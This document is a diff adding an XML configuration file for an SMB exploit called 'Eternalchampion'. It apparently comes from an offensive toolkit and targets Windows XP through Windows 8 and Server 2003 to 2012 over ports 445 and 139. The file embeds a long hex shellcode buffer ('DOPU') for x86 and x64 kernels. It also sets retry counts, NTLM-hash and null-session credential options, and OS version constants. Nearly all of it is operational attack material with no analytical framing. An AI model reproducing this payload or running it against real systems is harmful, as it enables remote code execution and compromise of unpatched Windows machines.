@@ -1,0 +1,170 @@
+<t:config xmlns:t="urn:trch" id="a2b184ef911a684c559fa2e9b9fa30ee868dfc70" configversion="2.0.0.0" name="Eternalchampion" version="2.0.0" schemaversion="2.1.0">
+<t:inputparameters>
+<t:parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16" format="Scalar" valid="true">
+<t:default>60</t:default>
+<t:value>60</t:value>
+</t:parameter>
+<t:parameter name="TargetIp" description="The actual (non-redirected) Target IP Address" type="IPv4" format="Scalar" valid="true">
+<t:value>_Target_IP_</t:value>
+</t:parameter>
+<t:parameter name="TargetPort" description="The actual (non-redirected) Target TCP port" type="TcpPort" format="Scalar" valid="true">
+<t:default>445</t:default>
+<t:value>_Target_Port_</t:value>
+</t:parameter>
+<t:parameter name="RedirectedTargetIp" description="The physical (redirected) target IP address" type="IPv4" format="Scalar" hidden="true" required="false"></t:parameter>
+<t:parameter name="RedirectedTargetPort" description="The physical (redirected) target TCP port" type="TcpPort" format="Scalar" hidden="true" required="false"></t:parameter>
+<t:parameter name="DaveProxyPort" description="DAVE Core/Proxy Hookup connection port" type="TcpPort" format="Scalar" hidden="true" valid="true">
+<t:default>0</t:default>
+<t:value>0</t:value>
+</t:parameter>
+<t:parameter name="MaxExploitAttempts" description="Number of tries to exploit. Default 42" type="U32" format="Scalar" hidden="true" valid="true">
+<t:default>42</t:default>
+<t:value>42</t:value>
+</t:parameter>
+<t:parameter name="PipeName" description="The named pipe to use (Win7+ only, need Pipe or Share)" type="String" format="Scalar" valid="true">
+<t:default></t:default>
+<t:value></t:value>
+</t:parameter>
+<t:parameter name="ShareName" description="The name of the share to use in Unicode (Win7+ only, need Pipe or Share)" type="Buffer" format="Scalar" valid="true">
+<t:default></t:default>
+<t:value></t:value>
+</t:parameter>
+<t:parameter name="ShellcodeBuffer" description="DOPU Shellcode buffer" type="Buffer" format="Scalar" valid="true">
+<t:value>31c040900f8490060000e800000000586089c389e583ec60648b0d38000000668b4106c1e010668b01662500f08b086681f94d5a74072d00100000ebf08945fc5389c3b9940169e3e8c60100008945f8b9855483f0e8b90100008945f4b92e5b51d2e8ac0100008945ecb9b45ca05be89f0100008945a45bb91401000029cc890c2454ff55a48b4c24048b54240881c41401000031c080f9067c0680fa027c01408945b88d55e831c9890a526a00526a0bff55ec8b55e885d20f8450010000526a00ff55f885c00f844201000089c789c66a00ff75e8576a0bff55ec85c00f852b01000081effc00000031c08945b48945b081c71c01000089f8e8c7010000b9fa3cadc239c8742fb91abd4b2b39c87426b98b2d3d7639c87425b96bdd461f39c8741c8b55e881ea1c0100000f8cdd0000008955e8ebbb8b4fec894db4eb068b4fec894db0e86502000085c074a456ff55f48b75b489f05050682e6461746a61e88802000085c00f84a20000005883e940e8bb02000085c074158b16c1ea1889f0c1e81839d075078b464885c0740a83c60483e904e378ebd88975f05668f80f00006a00ff55f885c074645089c731c089c16681c10004f3ab5889008b55fc89500431d78b55f889500831d78b55f489500c31d78b55f089501031d78978248b4db885c97411e89e0100008b55ac8950548b55a889505883c06089c78db365040000b926020000f3a489c75b897b3889ec61c3535251575589e583ec1889cf89d88945fce87f00000085c0746e8945f8e8f30000008945f48b45fc8b4df8e81601000085c074548945f08b45fc8b4df8e80c01000085c074428945ec8b45fc8b4df8e80201000085c074308945e88b45fc89f98b55ec8b5df4e8b000000083f8ff742189c18b45e8e8e40000006689c28b45fc8b4df0e8de00000083c4185d5f595a5bc331c0ebf35689c683c63c8b3601c666813e5045750983c6788b3601f05ec331c0ebfa56515789c631c089c7c1e70729c789f831c98a0e80f900740501c846ebe95f595ec356575289c631c089c7c1e70729c789f831d28a1601d046e2ee5a5f5ec356515789c631c089c7c1e70729c789f831c98a0e80f90074c601c84646ebe85f595ec383c0188b00c357565131ff89c639df74198b04ba01f0e883ffffff39c8740747ebeb595e5fc389f8ebf8b8ffffffffebf183c11c8b0901c8c383c1208b0901c8c383c1248b0901c8c3d1e101c8668b00c381e2ffff0000c1e20201d18b0901c8c350538b5db0b9605ab582e87bfeffff8b500231c08a0284c075098955ac8945a84088025b58c331c08b4db485c9740f8b4db885c974078b4db085c9740140c352568b74240c8b4c241031d2d1e985c9740cc1c205ac460c2030c249ebf089d05e5ac20800585a5f5e505689f083c63c8b3601c631c089c1668b4e06668b461401c683c61885c9741d8b0639f875078b460439d0740683c62849ebe98b460c8b4e085e01c6c331f6c36031c083f80f741e31c98b3c868b148e39d774034175f30fb694035604000039d1750d40ebdd4139c875056131c040c36131c0c3000102030405060708090a09090d0e8b4c240460e8000000005d6681e500f0894d34e8e5010000e84f010000e88b01000085c00f84e30000008b5d3c8b4bd8e8230100003c23740d3c77741c3cc87422e9b60000008b4d388b452489410e31c0884112e99f000000e81f010000e9b50000008b5d3c8b43e88b303375288b7808337d288b40043345283b431089c3757b8b4d3039f18b452c7418e8fe0000008d4604506a00ff550885c0746389452c89753001df39f7775329df01c75789f28b753c8b76f089d9f3a45e89d9c1e9028b5d28311e83c604e2f901d039c67c288b452c6089e650ffd089f461e8ad0000008b4524d1e831c988c101e98b0931c8894524e874000000b010eb08b020eb04b030eb008b4d38b4006601411e8b45108944241c61ff603c8b555485d274058b4d58880a8d45608b4d0c89885301000089a84a01000066b810008b4d386601411e8b45108944241c6168000000008b403c506800000000c331c088c8c1e90800c8c1e90800c8c1e90800c8c3518b452489c10fc9d1e031c889452859c360e80b0000008b45108b483c89483861c3608b5d2c85db740d31c089df8b4d30f3aa53ff550c31c089453089452c61c357525689cf8b55448b0ae83900000085c0750e83c2088b0ae82b00000085c07421894d446a0c588d71543b06740783c6043b06750d3b4604750889753c31c040eb0231c05e5a5fc331c039c17d0140c3525131d2668b510201ca3b11740583c104ebf75a8d411c83c00724f88945448b41f889453889d15ac35355575641544155415641574889e54881eca80000006683e4f0e895040000488945f84889c3b92e5b51d2e8000300004885c00f84890200004889c6b9940169e3e8ea0200004885c00f8473020000488945f04889c7b9855483f0e8d00200004885c00f8459020000488945e8b9b45ca05be8b90200004885c00f84420200004889458831c0488945a048894598b9140100004829cc890c244889e14883ec2cff55884883c42c8b4c24048b5424084881c41401000031c080f9067c0780fa027c02ffc089857cffffff4c8d4dd04d31c04c89c1448945d04c89c2b10bffd6448b45d04585c00f84d60100008b55d04831c9ffd74885c00f84c50100004889c34831c94989c9448b45d04889c2b10bffd64885c00f85a80100004889df4881eff80000004881c7280100008b55d081ea280100000f8c880100008955d04889f8e8f002000089c2b9fa3cadc239ca741db91abd4b2b39ca7414b98b2d3d7639ca7415b96bdd461f39ca740cebb7488b77e8488975a0eb08488b77e848897598e88b01000085c0749c4889d9ff55e8488b45a04831d24889c38b503c4801d04889c64831c94889ca668b4806668b50144801d64883c61848bf2e646174610000004883f9000f84f8000000488b064839f874094883c62848ffc9ebe58b460c8b4e084801c648bbfefefefefefefefe4883e9084883f9000f8cc6000000488b3e4839df750c4c8b86980000004d85c074064883c608ebd84883c608488975e04831c9baf00f0000ff55f04885c00f84900000004989c14831c0b9000400004c89cff3ab4c89cf4881c788000000488d35130300004831c966b94702f3a44d8909488b5df8498959084831df488b5df0498959104831df488b5de8498959184831df488b5de0498959204831df418979448b8d7cffffff85c97417e834000000488b5590498951708b558041899180000000488b45e04883c0704981c1880000004c89084889ec415f415e415d415c5e5f5d5bc353488b5d98b9605ab582e84f0000004885c0741e48634802488d54010731c08a0284c0750b48895590894580ffc088025bc331c048894590894580ebf331c0488b4da04885c974158b8d7cffffff85c97409488b4d984885c97402ffc0c3535251554889e54881ec00010000574889cf4889d848898500ffffffe8bb00000048898508ffffffe84801000048898510ffffff488b8500ffffff488b8d08ffffffe89a01000048898518ffffff488b8500ffffff488b8d08ffffffe88f01000048898520ffffff488b8500ffffff488b8d08ffffffe88401000048898528ffffff488b8500ffffff4889f9488b9520ffffff488b9d10ffffffe80f01000048898530ffffff488b8528ffffff488b8d30ffffffe8550100006689c2488b8500ffffff488b8d18ffffffe8490100005f4881c4000100005d595a5bc356574831f68b703c4801c666813e504575124881c6880000004831ff8b3e4801f85f5ec34831c0ebf85651574889c64831c089c7c1e70729c789f831c98a0e80f900740701c848ffc6ebe75f595ec35657524889c64831c089c7c1e70729c789f831d28a1601d048ffc6e2ec5a5f5ec35651574889c64831c089c7c1e70729c789f831c98a0e80f900740a01c848ffc648ffc6ebe45f595ec3564889c64883c6184831c08b065ec35365488b042538000000488b400448c1e80c48c1e00c488b186681fb4d5a7408482d00100000ebee5bc35756514831ff4889c64831c08b04ba4801f0e840ffffff39c8740e48ffc74839df740bebe4595e5fc34889f8ebf74831c0ebf2564889c64831c08b411c4801f05ec3564889c64831c08b41204801f05ec3564889c64831c08b41244801f05ec348d1e14801c8668b00c34881ca0000ffff4881f20000ffff48c1e2024801d14831d28b114801d0c35756535541544155415641574989e44881ec080100004989cf488d2de0ffffff6681e500f048894d584831d2668b51024801ca483b117406488d4908ebf5488d412848894534488b41f048894528e828010000e88c0100004885c00f84ed0000004c8b6d3c418b4dbce8f90000003c23740d3c77741d3cc87423e9bd000000488b4d288b454489410eb001884112e9a5000000e8f4000000e99b0000004831db4831f64831ff498b45d88b188b70048b78088b4d4831cb31ce31cf413b7510757b3b5d54488b454c7416e8e2000000488d53044831c9ff55104889454c895d544885c0745b4801f74839df774f4829f74801c7574889f151498b75e8f3a45948c1e9025e8b554831164883c604e2f84801d84839c67c21ff554ce8920000008b4544d1e84831c988c14801e98b0931c8894544e843000000b010eb08b020eb04b030eb00488b4d28b4006601411e488b45204c89f94c89e4415f415e415d415c5d5b5e5fff607831c088c8c1e90800c8c1e90800c8c1e90800c8c3518b454489c10fc9d1e031c889454859c351e81f000000488b4520488b487848894870488b4d704885c974088b8580000000880159c353574883ec28488b5d4c4885db741331c04889df4831c98b4d54f3aa4889d9ff55184831c08945544889454c4883c4285f5bc3515657488b7534488b0ee8480000004885c07511488d7608488b0ee8370000004885c0742b48894d346a0c58488db1900000003b0674084883c6083b0675113b4604750c4889753c4831c048ffc0eb034831c05f5e59c34831c04839c17d0348ffc0c3</t:value>
+</t:parameter>
+<t:paramchoice name="Credentials" description="Type of credentials to use">
+<t:default>Anonymous</t:default>
+<t:value>Anonymous</t:value>
+<t:paramgroup name="Anonymous" description="Anonymous (NULL session)"></t:paramgroup>
+<t:paramgroup name="Guest" description="Guest account"></t:paramgroup>
+<t:paramgroup name="Blank" description="User account with no password set">
+<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="Password" description="User name and password">
+<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
+<t:parameter name="Password" description="Password entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
+</t:paramgroup>
+<t:paramgroup name="NTLM" description="User name and NTLM hash">
+<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
+<t:parameter name="NtlmHash" description="NTLM password hash (in hex)" type="Buffer" format="Scalar"></t:parameter>
+</t:paramgroup>
+</t:paramchoice>
+<t:paramchoice name="Protocol" description="SMB (default port 445) or NBT (default port 139)">
+<t:default>SMB</t:default>
+<t:value>_Proto_Type_</t:value>
+<t:paramgroup name="SMB" description="SMB protocol"></t:paramgroup>
+<t:paramgroup name="NBT" description="Netbios protocol"></t:paramgroup>
+</t:paramchoice>
+<t:paramchoice name="Target" description="Operating System, Service Pack, of target OS">
+<t:value>_Target_OS_</t:value>
+<t:paramgroup name="XP_SP0SP1_X86" description="Windows XP Sp0 and Sp1, 32-bit"></t:paramgroup>
+<t:paramgroup name="XP_SP2SP3_X86" description="Windows XP Sp2 and Sp3, 32-bit"></t:paramgroup>
+<t:paramgroup name="XP_SP1_X64" description="Windows XP Sp1, 64-bit"></t:paramgroup>
+<t:paramgroup name="XP_SP2_X64" description="Windows XP Sp2, 64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2003_SP0" description="Windows Sever 2003 Sp0, 32-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2003_SP1" description="Windows Sever 2003 Sp1, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2003_SP2" description="Windows Sever 2003 Sp2, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="VISTA_SP0" description="Windows Vista Sp0, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="VISTA_SP1" description="Windows Vista Sp1, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="VISTA_SP2" description="Windows Vista Sp2, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2008_SP0" description="Windows Server 2008 Sp0, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2008_SP1" description="Windows Server 2008 Sp1, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2008_SP2" description="Windows Server 2008 Sp2, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="WIN7_SP0" description="Windows 7 Sp0, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="WIN7_SP1" description="Windows 7 Sp1, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2008R2_SP0" description="Windows Server 2008 R2 Sp0, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="SERVER_2008R2_SP1" description="Windows Server 2008 R2 Sp1, 32-bit/64-bit"></t:paramgroup>
+<t:paramgroup name="WIN8_SP0" description="Windows 8 Sp0, 32-bit/64-bit"></t:paramgroup>
+</t:paramchoice>
+<t:paramchoice name="TargetOsArchitecture" description="The architecture of the target operating system">
+<t:default>Unknown</t:default>
+<t:value>_Target_Arch_</t:value>
+<t:paramgroup name="Unknown" description="The architecture is not known (exploit will figure it out)"></t:paramgroup>
+<t:paramgroup name="x86" description="The target is 32-bit"></t:paramgroup>
+<t:paramgroup name="x64" description="The target is 64-bit"></t:paramgroup>
+</t:paramchoice>
+</t:inputparameters>
+<t:constants>
+<t:parameter name="XP_SP0SP1_X86" description="" type="U32" format="Scalar" valid="true">
+<t:value>83951616</t:value>
+</t:parameter>
+<t:parameter name="XP_SP2SP3_X86" description="" type="U32" format="Scalar" valid="true">
+<t:value>83952128</t:value>
+</t:parameter>
+<t:parameter name="XP_SP1_X64" description="" type="U32" format="Scalar" valid="true">
+<t:value>84017409</t:value>
+</t:parameter>
+<t:parameter name="XP_SP2_X64" description="" type="U32" format="Scalar" valid="true">
+<t:value>84017665</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2003_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>2231500802</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2003_SP1" description="" type="U32" format="Scalar" valid="true">
+<t:value>2231501058</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2003_SP2" description="" type="U32" format="Scalar" valid="true">
+<t:value>2231501314</t:value>
+</t:parameter>
+<t:parameter name="VISTA_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>100663298</t:value>
+</t:parameter>
+<t:parameter name="VISTA_SP1" description="" type="U32" format="Scalar" valid="true">
+<t:value>100663554</t:value>
+</t:parameter>
+<t:parameter name="VISTA_SP2" description="" type="U32" format="Scalar" valid="true">
+<t:value>100663810</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2008_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248146946</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2008_SP1" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248147202</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2008_SP2" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248147458</t:value>
+</t:parameter>
+<t:parameter name="WIN7_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>100728834</t:value>
+</t:parameter>
+<t:parameter name="WIN7_SP1" description="" type="U32" format="Scalar" valid="true">
+<t:value>100729090</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2008R2_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248212482</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2008R2_SP1" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248212738</t:value>
+</t:parameter>
+<t:parameter name="WIN8_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>100794370</t:value>
+</t:parameter>
+<t:parameter name="SERVER_2K12_SP0" description="" type="U32" format="Scalar" valid="true">
+<t:value>2248278018</t:value>
+</t:parameter>
+<t:parameter name="x86" description="32-bit Architecture" type="U8" format="Scalar" valid="true">
+<t:value>0</t:value>
+</t:parameter>
+<t:parameter name="x64" description="64-bit Architecture" type="U8" format="Scalar" valid="true">
+<t:value>1</t:value>
+</t:parameter>
+<t:parameter name="Unknown" description="Unknown Architecture" type="U8" format="Scalar" valid="true">
+<t:value>2</t:value>
+</t:parameter>
+<t:parameter name="Anonymous" description="" type="U8" format="Scalar" valid="true">
+<t:value>0</t:value>
+</t:parameter>
+<t:parameter name="Guest" description="" type="U8" format="Scalar" valid="true">
+<t:value>1</t:value>
+</t:parameter>
+<t:parameter name="Blank" description="" type="U8" format="Scalar" valid="true">
+<t:value>2</t:value>
+</t:parameter>
+<t:parameter name="Password" description="" type="U8" format="Scalar" valid="true">
+<t:value>3</t:value>
+</t:parameter>
+<t:parameter name="NTLM" description="" type="U8" format="Scalar" valid="true">
+<t:value>4</t:value>
+</t:parameter>
+</t:constants>
+</t:config>
